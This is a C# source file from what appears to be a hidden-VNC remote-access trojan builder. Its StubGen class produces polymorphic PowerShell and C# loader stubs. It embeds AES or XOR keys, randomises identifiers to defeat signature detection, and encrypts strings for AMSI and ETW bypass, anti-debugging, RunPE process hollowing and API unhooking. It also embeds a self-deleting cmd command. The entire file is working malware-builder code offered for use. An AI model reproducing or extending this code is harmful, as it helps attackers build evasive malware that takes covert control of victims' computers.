using System;
using System.Text;

namespace ShitarusPrivate.HVNC.StubUtils
{
    public class StubGen
    {
        public static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
        {
            string newValue = Utils.RandomString(5, rng);
            string newValue2 = Utils.RandomString(5, rng);
            string newValue3 = Utils.RandomString(5, rng);
            string newValue4 = Utils.RandomString(5, rng);
            string newValue5 = Utils.RandomString(5, rng);
            string newValue6 = Utils.RandomString(5, rng);
            string newValue7 = Utils.RandomString(5, rng);
            string newValue8 = Utils.RandomString(5, rng);
            string newValue9 = Utils.RandomString(5, rng);
            string newValue10 = Utils.RandomString(5, rng);
            string newValue11 = Utils.RandomString(5, rng);
            if (mode == EncryptionMode.AES)
            {
                string embeddedString = Utils.GetEmbeddedString("HVNC.Resources.AESStub.ps1");
                embeddedString = embeddedString.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
                embeddedString = embeddedString.Replace("DECRYPTION_IV", Convert.ToBase64String(iv));
                embeddedString = embeddedString.Replace("tbsreversed_var", newValue);
                embeddedString = embeddedString.Replace("tbs_var", newValue2);
                embeddedString = embeddedString.Replace("contents_var", newValue3);
                embeddedString = embeddedString.Replace("lastline_var", newValue4);
                embeddedString = embeddedString.Replace("payload_var", newValue5);
                embeddedString = embeddedString.Replace("aes_var", newValue7);
                embeddedString = embeddedString.Replace("decryptor_var", newValue8);
                embeddedString = embeddedString.Replace("msi_var", newValue9);
                embeddedString = embeddedString.Replace("mso_var", newValue10);
                embeddedString = embeddedString.Replace("gs_var", newValue11);
                return embeddedString.Replace(Environment.NewLine, string.Empty);
            }
            string embeddedString2 = Utils.GetEmbeddedString("HVNC.Resources.XORStub.ps1");
            embeddedString2 = embeddedString2.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
            embeddedString2 = embeddedString2.Replace("tbsreversed_var", newValue);
            embeddedString2 = embeddedString2.Replace("tbs_var", newValue2);
            embeddedString2 = embeddedString2.Replace("contents_var", newValue3);
            embeddedString2 = embeddedString2.Replace("lastline_var", newValue4);
            embeddedString2 = embeddedString2.Replace("payload_var", newValue5);
            embeddedString2 = embeddedString2.Replace("key_var", newValue6);
            embeddedString2 = embeddedString2.Replace("msi_var", newValue9);
            embeddedString2 = embeddedString2.Replace("mso_var", newValue10);
            embeddedString2 = embeddedString2.Replace("gs_var", newValue11);
            return embeddedString2.Replace(Environment.NewLine, string.Empty);
        }

        public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
        {
            string newValue = Utils.RandomString(20, rng);
            string newValue2 = Utils.RandomString(20, rng);
            string newValue3 = Utils.RandomString(20, rng);
            string newValue4 = Utils.RandomString(20, rng);
            string newValue5 = Utils.RandomString(20, rng);
            string newValue6 = Utils.RandomString(20, rng);
            string newValue7 = Utils.RandomString(20, rng);
            string newValue8 = Utils.RandomString(20, rng);
            string newValue9 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, iv));
            string newValue10 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("EtwEventWrite"), key, iv));
            string newValue11 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, iv));
            string newValue12 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, iv));
            string newValue13 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("payload.exe"), key, iv));
            string newValue14 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("runpe.dll"), key, iv));
            string newValue15 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("runpe.RunPE"), key, iv));
            string newValue16 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("ExecutePE"), key, iv));
            string newValue17 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.dll"), key, iv));
            string newValue18 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.APIUnhooker"), key, iv));
            string newValue19 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("Start"), key, iv));
            string newValue20 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h \""), key, iv));
            string newValue21 = Convert.ToBase64String(key);
            string newValue22 = Convert.ToBase64String(iv);
            string text = string.Empty;
            string embeddedString = Utils.GetEmbeddedString("HVNC.Resources.Stub.cs");
            if (antidebug)
            {
                text += "#define ANTI_DEBUG\n";
            }
            if (antivm)
            {
                text += "#define ANTI_VM\n";
            }
            if (native)
            {
                text += "#define USE_RUNPE\n";
            }
            text = ((mode != EncryptionMode.XOR) ? (text + "#define AES_ENCRYPT\n") : (text + "#define XOR_ENCRYPT\n"));
            embeddedString = embeddedString.Replace("namespace_name", newValue);
            embeddedString = embeddedString.Replace("class_name", newValue2);
            embeddedString = embeddedString.Replace("aesfunction_name", newValue3);
            embeddedString = embeddedString.Replace("uncompressfunction_name", newValue4);
            embeddedString = embeddedString.Replace("getembeddedresourcefunction_name", newValue5);
            embeddedString = embeddedString.Replace("virtualprotect_name", newValue6);
            embeddedString = embeddedString.Replace("checkremotedebugger_name", newValue7);
            embeddedString = embeddedString.Replace("isdebuggerpresent_name", newValue8);
            embeddedString = embeddedString.Replace("amsiscanbuffer_str", newValue9);
            embeddedString = embeddedString.Replace("etweventwrite_str", newValue10);
            embeddedString = embeddedString.Replace("checkremotedebugger_str", newValue11);
            embeddedString = embeddedString.Replace("isdebuggerpresent_str", newValue12);
            embeddedString = embeddedString.Replace("payloadtxt_str", newValue13);
            embeddedString = embeddedString.Replace("runpedlltxt_str", newValue14);
            embeddedString = embeddedString.Replace("runpeclass_str", newValue15);
            embeddedString = embeddedString.Replace("runpefunction_str", newValue16);
            embeddedString = embeddedString.Replace("unhookertxt_str", newValue17);
            embeddedString = embeddedString.Replace("unhookerclass_str", newValue18);
            embeddedString = embeddedString.Replace("unhookerfunction_str", newValue19);
            embeddedString = embeddedString.Replace("cmdcommand_str", newValue20);
            embeddedString = embeddedString.Replace("key_str", newValue21);
            embeddedString = embeddedString.Replace("iv_str", newValue22);
            return text + embeddedString;
        }
    }
}
